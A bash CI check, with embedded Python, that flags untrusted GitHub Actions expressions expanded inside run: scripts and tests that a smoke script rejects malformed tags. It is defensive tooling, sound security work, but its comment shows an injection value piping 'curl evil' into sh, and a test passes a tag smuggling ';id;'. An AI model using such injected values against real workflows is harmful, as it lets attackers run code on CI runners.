#!/usr/bin/env bash
# Reject GitHub Actions script injection: an attacker- or dispatcher-
# controlled `${{ ... }}` expression expanded directly inside a `run:` script
# is substituted into the shell source BEFORE bash parses it, so a value like
# `x'; curl evil | sh; '` executes. The safe pattern is to pass the value
# through `env:` and reference "$VAR" (then validate it).
#
# Flagged inside any `run:` block of .github/workflows/*.yml and action.yml:
#   github.event.*      (inputs, PR titles/bodies, commit messages, ...)
#   github.head_ref     (PR branch name)
#   inputs.*            (workflow_dispatch / workflow_call / action inputs)
#   steps.*.outputs.*   (often derived from the above)
#   needs.*.outputs.*   (ditto, across jobs)
# Anything else (github.sha, runner.temp, matrix values, secrets via env, ...)
# is out of scope here.
set -euo pipefail

REPO_ROOT="${SCRIPT_INJECTION_REPO_ROOT:-$(cd "$(dirname "$0")/../.." && pwd)}"
cd "$REPO_ROOT"

python3 - <<'PY'
from pathlib import Path
import re
import sys

UNSAFE = re.compile(
    r'\$\{\{[^}]*\b(github\.event\.|github\.head_ref|inputs\.|steps\.[A-Za-z0-9_-]+\.outputs|needs\.[A-Za-z0-9_-]+\.outputs)'
)
RUN = re.compile(r'^(?P<indent>\s*)(?:-\s+)?run:\s*(?P<rest>.*)$')


def run_blocks(lines):
    i = 0
    while i < len(lines):
        m = RUN.match(lines[i])
        if not m:
            i += 1
            continue
        rest = m.group('rest').strip()
        start = i
        if rest and rest[0] not in '|>':
            yield start, [lines[i]]
            i += 1
            continue
        key_indent = len(m.group('indent')) + (2 if lines[i].lstrip().startswith('- ') else 0)
        body = [lines[i]]
        i += 1
        while i < len(lines):
            line = lines[i]
            if line.strip() and len(line) - len(line.lstrip()) <= key_indent:
                break
            body.append(line)
            i += 1
        yield start, body


def scan(path):
    found = []
    lines = path.read_text(encoding='utf-8').splitlines()
    for start, body in run_blocks(lines):
        for offset, line in enumerate(body):
            if line.lstrip().startswith('#'):
                continue
            if UNSAFE.search(line):
                found.append(f'{path}:{start + offset + 1}: {line.strip()}')
    return found


# Self-test so a regex/parser refactor cannot make the gate vacuously green.
fixture = [
    'jobs:',
    '  a:',
    '    steps:',
    '      - run: echo ${{ github.event.inputs.x }}',
    '      - name: multi',
    '        run: |',
    '          echo ok',
    '          echo ${{ steps.pick.outputs.target }}',
    '        env:',
    '          SAFE: ${{ steps.pick.outputs.target }}',
    '      - run: echo ${{ github.sha }}',
]
hits = [s for s, body in run_blocks(fixture) for l in body if UNSAFE.search(l)]
if hits != [3, 5]:
    print(f'[script-injection] internal fixture mismatch: {hits}', file=sys.stderr)
    sys.exit(1)

paths = sorted(Path('.github/workflows').glob('*.y*ml')) + [Path('action.yml')]
problems = [p for path in paths if path.exists() for p in scan(path)]
if problems:
    print('[script-injection] untrusted ${{ }} expansion inside run: (move it to env: and validate):',
          file=sys.stderr)
    for p in problems:
        print(f'  {p}', file=sys.stderr)
    sys.exit(1)
print(f'[script-injection] OK - {len(paths)} workflow/action files, no untrusted expansion in run: blocks')
PY

# smoke-channel.sh receives the dispatch-controlled tag: it must reject a
# non-vX.Y.Z value before using it, and never splice it into a `bash -c` string.
# (A nonexistent channel keeps a regression from installing anything.)
smoke_out=$(ci/scripts/smoke-channel.sh no-such-channel "v1.2.3';id;'" 2>&1 || true)
if ! grep -q 'invalid tag' <<< "$smoke_out"; then
  echo "[script-injection] smoke-channel.sh accepted a malformed tag" >&2
  exit 1
fi
if grep -nE 'bash -c "[^"]*\$\{?TAG' ci/scripts/smoke-channel.sh; then
  echo "[script-injection] smoke-channel.sh splices TAG into a bash -c string" >&2
  exit 1
fi
echo "[script-injection] OK - smoke-channel.sh validates its tag"
